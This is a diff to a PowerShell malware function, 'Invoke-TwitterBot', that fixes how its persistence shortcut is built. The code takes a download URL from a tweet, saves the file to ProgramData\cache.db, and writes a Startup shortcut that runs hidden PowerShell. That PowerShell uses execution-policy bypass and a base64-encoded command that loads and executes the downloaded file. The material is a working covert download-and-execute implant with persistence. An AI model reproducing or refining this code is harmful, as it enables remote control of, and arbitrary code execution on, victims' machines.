@@ -291,7 +291,7 @@ Function Invoke-TwitterBot {
         Function PersistCommand {
             
             [string] $downloadURL = $LatestTweet.split('|')[1]
-            #This is hardcoded in due to MAX_PATH limitations in shortcuts. if changed $RunPath must be reencoded and must remain under 259 characters
+            #This is hardcoded in due to MAX_PATH limitations in shortcuts. if changed $RunArguments must be reencoded and must remain under 259 characters
             [string] $FileOnDisk = "$env:programdata\cache.db"
 
             if ($downloadURL.Substring(0,5) -ceq "https") {
@@ -306,7 +306,8 @@ Function Invoke-TwitterBot {
             Write-Verbose "I am downloading from $ActualdownloadURL"
             Write-Verbose "I am saving the file to $FileOnDisk"
             $downloadedScript = $WebClientObject.downloadFile($downloadURL,$FileOnDisk)
-            $RunPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -exe bypass -nol -win hidden -enc JABBACAAPQAgAEcAQwAgACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABjAGEAYwBoAGUALgBkAGIAOwAgAEkARQBYACAAJABBAA=='
+            $RunPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe'
+            $RunArguments ='-exe bypass -nol -win hidden -enc JABBACAAPQAgAEcAQwAgACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABjAGEAYwBoAGUALgBkAGIAOwAgAEkARQBYACAAJABBAA=='
 
                     if ($IsAdmin -eq $True) {
                         [string] $PersistencePath = "$env:ALLUSERSPROFILE" + '\Microsoft\Windows\Start Menu\Programs\StartUp\StartUp.lnk'
@@ -319,6 +320,7 @@ Function Invoke-TwitterBot {
                     $WScript = New-Object -ComObject Wscript.Shell
                     $Shortcut = $Wscript.CreateShortcut($PersistencePath)
                     $Shortcut.TargetPath = ($RunPath)
+                    $Shortcut.Arguments = ($RunArguments)
                     $Shortcut.Save()
         }       
         
